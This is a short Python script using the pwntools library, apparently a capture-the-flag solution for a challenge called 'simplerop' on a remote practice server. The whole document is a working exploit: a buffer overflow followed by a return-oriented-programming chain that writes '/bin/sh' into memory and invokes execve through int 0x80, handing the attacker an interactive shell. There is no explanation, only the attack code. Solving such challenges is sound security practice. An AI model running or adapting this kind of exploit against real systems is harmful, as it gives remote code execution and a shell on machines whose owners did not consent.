#coding:utf-8
from pwn import *
 
sh = remote('node3.buuoj.cn',27937)
# sh = process("./simplerop")
int_80 = 0x80493e1
pop_eax = 0x80bae06
read_addr = 0x0806CD50
binsh_addr = 0x080EB584
pop_edx_ecx_ebx = 0x0806e850
payload = 'a'*0x20 + p32(read_addr) + p32(pop_edx_ecx_ebx) + p32(0) + p32(binsh_addr) + p32(0x8) + p32(pop_eax) + p32(0xb) + p32(pop_edx_ecx_ebx) + p32(0) + p32(0) + p32(binsh_addr) + p32(int_80)
sh.sendline(payload)
sh.sendline('/bin/sh\x00')
sh.interactive()